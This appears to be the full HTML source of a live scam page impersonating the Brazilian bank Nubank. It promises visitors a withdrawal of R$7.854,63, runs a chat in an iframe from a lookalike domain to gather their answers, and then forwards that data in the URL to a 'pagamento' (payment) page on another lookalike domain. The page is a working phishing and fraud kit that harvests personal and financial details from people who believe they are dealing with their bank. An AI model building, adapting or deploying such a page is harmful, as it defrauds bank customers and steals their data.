<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Chat - Nubank</title>
  <link rel="icon" href="https://nu-atendimento.site/favicon.ico" type="image/x-icon" sizes="256x256">
  <script src="https://cdn.tailwindcss.com/"></script>
  <script>
  window.pixelId = "673cd18ac1a87f0eeb7b11d4";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
  <style>
    * {
      font-family: Arial, Helvetica, sans-serif !important;
    }

    body {
      font-family: Arial, Helvetica, sans-serif;
    }

    input,
    input:focus {
      box-shadow: none !important;
      outline: none !important;
      font-family: Arial, Helvetica, sans-serif;
    }

    input:focus {
      border-color: #8a05be !important;
      border-width: 0 0 2px !important;
    }

    .text-lg,
    .text-sm,
    .text-md,
    .text-xs,
    .font-semibold,
    .font-bold {
      font-family: Arial, Helvetica, sans-serif !important;
    }
  </style>
</head>

<body class="overflow-y-hidden max-h-screen bg-[#831BD1]">
  <header class="bg-white px-4 shadow-md">
    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
      <img alt="Logo Nubank" width="1920" height="1080" class="w-auto h-16" style="color:transparent"
        src="images/image.png">
    </div>
  </header>

  <div class="flex flex-col">
    <main class="flex-1 px-4 py-2">
      <div class="flex flex-col">
        <main>
          <div class="max-h-min">
            <div class="px-0.5 pb-[0.6rem]">
              <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
                <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
                  <p class="text-base">
                    <span>Olá, </span>
                    <span class="text-black font-bold" id="user-name"></span>
                  </p>
                  <p class="mt-1 text-sm">
                    Responda as perguntas abaixo para realizar<br>
                    seu saque de <span>R$7.854,63</span>
                  </p>
                </div>
                <div class="w-full h-full">
                     <iframe id="meuIframe" 
            title="Chat de Suporte"
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups"  class="w-full" style="height: 90%;margin-top: 15px;" id="iframe-container"></iframe>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </main>
  </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const iframe = document.getElementById('meuIframe');
            const queryParams = window.location.search;
            
            // URL base + parâmetros
            const iframeUrl = "https://chat.brasil-atendimentos.online/nubnbn" + queryParams;
            
            // Verifica se já não está com a URL correta para evitar loop
            if (iframe.src !== iframeUrl) {
                iframe.src = iframeUrl;
            }
            
            // Monitora possíveis recarregamentos
            let loadCount = 0;
            iframe.addEventListener('load', function() {
                loadCount++;
                console.log('Iframe carregado', loadCount, 'vezes');
                if (loadCount > 2) {
                    console.warn('Possível loop de recarregamento detectado');
                    // Aqui você pode adicionar lógica para interromper o loop
                }
            });
            
            // Captura erros sem permitir que eles recarreguem a página
            iframe.addEventListener('error', function(e) {
                console.error('Erro no iframe:', e);
                e.preventDefault();
            });
        });
        
        // Remove o script de UTM que pode estar causando conflitos
        document.querySelector('[src="https://cdn.utmify.com.br/scripts/utms/latest.js"]')?.remove();
    </script>
<script>
  let tbData = {};                    // guarda os dados vindos do Typebot
  
  window.addEventListener("message", (e) => {
    const msg = e.data;
    if (!msg) return;

    if (msg.action === "envioDados" && msg.data) {
      tbData = { ...msg.data };
      return;
    }
  
    if (msg === "requestRedirection" || msg.action === "requestRedirection") {
      const params = new URLSearchParams(window.location.search);
  
      Object.entries(tbData).forEach(([k, v]) => params.set(k, v));
  
      window.location.href = "https://nu-atendimento.site/pagamento/index.html?" + params.toString();
    }
  });
  </script>
  
</body>
</html> 